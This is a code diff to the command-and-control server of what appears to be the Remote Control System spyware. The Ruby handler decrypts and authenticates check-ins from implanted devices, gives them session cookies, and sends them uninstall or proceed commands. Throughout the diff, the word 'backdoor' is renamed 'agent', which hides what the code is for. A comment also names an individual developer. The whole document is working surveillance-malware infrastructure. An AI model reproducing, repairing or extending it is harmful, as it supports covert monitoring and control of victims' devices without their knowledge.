@@ -29,13 +29,15 @@ class Protocol
   # <-  [ Crypt_C ( Ks ), Crypt_K ( NonceDevice, Response ) ]  |  SetCookie ( SessionCookie )
   def self.authenticate(peer, uri, content)
     trace :info, "[#{peer}] Authentication required..."
-
+    
     # integrity check (104 byte of data, 112 padded)
     return unless content.length == 112
-
+    
     # decrypt the message with the per customer signature
     begin
-      message = aes_decrypt(content, DB.backdoor_signature)
+      # the NO_PAD is needed because zeno (Fabrizio Cornelli) has broken his code
+      # from RCS 7.x to RCS daVinci. He owes me a beer :)
+      message = aes_decrypt(content, DB.instance.agent_signature, RCS::Crypt::PAD_NOPAD)
     rescue Exception => e
       trace :error, "[#{peer}] Invalid message decryption: #{e.message}"
       return
@@ -56,7 +58,16 @@ class Protocol
 
     # the build_id identification
     build_id = message.slice!(0..15)
-    trace :info, "[#{peer}] Auth -- BuildId: " << build_id.delete("\x00")
+    build_id_real = build_id.delete("\x00")
+    # substitute the first 4 chars with RCS_ because of the client side scrambling
+    build_id_real[0..3] = 'RCS_'
+    trace :info, "[#{peer}] Auth -- BuildId: " << build_id_real
+
+    # check that the ident is decrypted correctly (it only has RCS_ and numbers)
+    if Regexp.new('(RCS_)([0-9]{10})', Regexp::IGNORECASE).match(build_id_real).nil?
+      trace :error, "[#{peer}] Auth -- Invalid BuildId. Possible decryption issue."
+      return
+    end
 
     # instance of the device
     instance_id = message.slice!(0..19)
@@ -70,13 +81,17 @@ class Protocol
     sha = message.slice!(0..19)
     trace :debug, "[#{peer}] Auth -- sha: " << sha.unpack('H*').to_s
 
-    # get the class key from the db
-    conf_key = DB.class_key_of build_id.delete("\x00")
+    # get the factory key from the db
+    conf_key = DB.instance.factory_key_of build_id_real
 
     # this class does not exist
-    return if conf_key.nil?
+    if conf_key.nil?
+      trace :warn, "[#{peer}] Factory key not found"
+      return
+    end
 
-    # the server will calculate the same sha digest and authenticate the backdoor
+
+    # the server will calculate the same sha digest and authenticate the agent
     # since the conf key is pre-shared
     sha_check = Digest::SHA1.digest(build_id + instance_id + subtype + conf_key)
     trace :debug, "[#{peer}] Auth -- sha_check: " << sha_check.unpack('H*').to_s
@@ -90,8 +105,7 @@ class Protocol
     trace :info, "[#{peer}] Authentication phase 1 completed"
 
     # remove the trailing zeroes from the strings
-    build_id.delete!("\x00")
-    instance_id = instance_id.unpack('H*').first
+    instance_id = instance_id.unpack('H*').first.downcase
     subtype.delete!("\x00")
 
     # random key part chosen by the server
@@ -105,31 +119,32 @@ class Protocol
 
     # prepare the response:
     # Crypt_C ( Ks ), Crypt_K ( NonceDevice, Response )
-    message = aes_encrypt(ks, DB.backdoor_signature)
+    message = aes_encrypt(ks, DB.instance.agent_signature)
 
-    # ask the database the status of the backdoor
-    status, bid = DB.status_of(build_id, instance_id, subtype)
+    # ask the database the status of the agent
+    status, bid = DB.instance.agent_status(build_id_real, instance_id, subtype)
 
     response = [Commands::PROTO_NO].pack('I')
-    # what to do based on the backdoor status
+    # what to do based on the agent status
     case status
-      when DB::DELETED_BACKDOOR, DB::NO_SUCH_BACKDOOR, DB::CLOSED_BACKDOOR
+      when DB::DELETED_AGENT, DB::NO_SUCH_AGENT, DB::CLOSED_AGENT
         response = [Commands::PROTO_UNINSTALL].pack('I')
-        trace :info, "[#{peer}] Uninstall command sent"
-      when DB::QUEUED_BACKDOOR
+        trace :info, "[#{peer}] Uninstall command sent (#{status})"
+        DB.instance.agent_uninstall(bid)
+      when DB::QUEUED_AGENT
         response = [Commands::PROTO_NO].pack('I')
         trace :warn, "[#{peer}] was queued for license limit exceeded"
-      when DB::ACTIVE_BACKDOOR, DB::UNKNOWN_BACKDOOR
+      when DB::ACTIVE_AGENT, DB::UNKNOWN_AGENT
         # everything is ok or the db is not connected, proceed
         response = [Commands::PROTO_OK].pack('I')
 
         # create a valid cookie session
-        cookie = SessionManager.create(bid, build_id, instance_id, subtype, k)
+        cookie = SessionManager.instance.create(bid, build_id_real, instance_id, subtype, k)
 
         trace :info, "[#{peer}] Authentication phase 2 completed [#{cookie}]"
     end
 
-    # complete the message for the backdoor
+    # complete the message for the agent
     message += aes_encrypt(nonce + response, k)
 
     return message, 'application/octet-stream', cookie
@@ -139,7 +154,7 @@ class Protocol
   def self.valid_authentication(peer, cookie)
 
     # check if the cookie was created correctly and if it is still valid
-    valid = SessionManager.check(cookie)
+    valid = SessionManager.instance.check(cookie)
 
     if valid then
       trace :debug, "[#{peer}][#{cookie}] Authenticated"
@@ -153,7 +168,7 @@ class Protocol
   
   def self.commands(peer, cookie, content)
     # retrieve the session
-    session = SessionManager.get cookie
+    session = SessionManager.instance.get cookie
 
     # invalid session
     if session.nil?
@@ -191,7 +206,7 @@ class Protocol
       return
     end
 
-    return response, 'application/octet-stream'
+    return response, 'application/octet-stream', cookie
   end
 
   # the protocol is parsed here
@@ -199,7 +214,7 @@ class Protocol
   #   - Authentication
   #   - Commands
   def self.parse(peer, uri, cookie, content)
-
+    
     # if the request does not contains any cookies,
     # we need to perform authentication first
     return authenticate(peer, uri, content) if cookie.nil?
